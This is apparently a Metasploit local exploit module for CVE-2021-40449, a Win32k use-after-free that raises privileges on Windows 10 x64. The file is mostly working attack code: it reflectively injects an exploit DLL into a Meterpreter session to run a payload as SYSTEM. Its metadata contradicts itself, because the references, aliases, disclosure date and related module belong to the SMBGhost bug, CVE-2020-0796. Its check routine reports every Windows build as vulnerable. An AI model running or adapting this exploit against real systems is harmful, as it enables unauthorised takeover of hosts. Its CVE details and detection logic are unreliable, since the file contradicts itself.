##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
            update_info(
                    info,
                    {
                            'Name'           => 'CVE-2021-40449 Win32k Elevation of Privilege Vulnerability ',
                            'Description'    => %q{The vulnerability exists in GreResetDCInternal.
                              If an attacker hooks the user-mode callback DrvEnablePDEV, which is called during hdcOpenDCW,
                              it is possible to destroy the original device context by calling ResetDC,
                              which causes a use-after-free in the kernel when the user-mode callback returns.},
                            'License'        => MSF_LICENSE,
                            'Author'         => [
                                    'Oliver Lyak', # original LPE exploit
                                    'Funnywolf' # metasploit module
                            ],
                            'Arch'           => [ARCH_X86, ARCH_X64],
                            'Platform'       => 'win',
                            'SessionTypes'   => ['meterpreter'],
                            'DefaultOptions' => {
                                    'EXITFUNC' => 'thread'
                            },
                            'Targets'        => [
                                    ['Windows 10 x64', { 'Arch' => ARCH_X64 }]
                            ],
                            'Payload'        => {
                                    'DisableNops' => true
                            },
                            'References'     => [
                                    ['CVE', '2020-0796'],
                                    ['URL', 'https://github.com/danigargu/CVE-2020-0796'],
                                    ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005']
                            ],
                            'DisclosureDate' => '2020-03-13',
                            'DefaultTarget'  => 0,
                            'Notes'          => {
                                    'AKA'            => ['SMBGhost', 'CoronaBlue'],
                                    'Stability'      => [CRASH_OS_RESTARTS,],
                                    'SideEffects'    => [IOC_IN_LOGS],
                                    'Reliability'    => [REPEATABLE_SESSION,],
                                    'RelatedModules' => ['exploit/windows/smb/cve_2020_0796_smbghost']
                            }
                    }
            )
    )
  end

  def check
    sysinfo_value = sysinfo['OS']

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end

    build_num = sysinfo_value.match(/\w+\d+\w+(\d+)/)[0].to_i
    vprint_status("Windows Build Number = #{build_num}")
    CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Reflectively injecting the exploit DLL and executing it...')

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    encoded_payload = payload.encoded
    execute_dll(
            ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-40449', 'CVE-2021-40449.x64.dll'),
            [encoded_payload.length].pack('I<') + encoded_payload
    )

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end
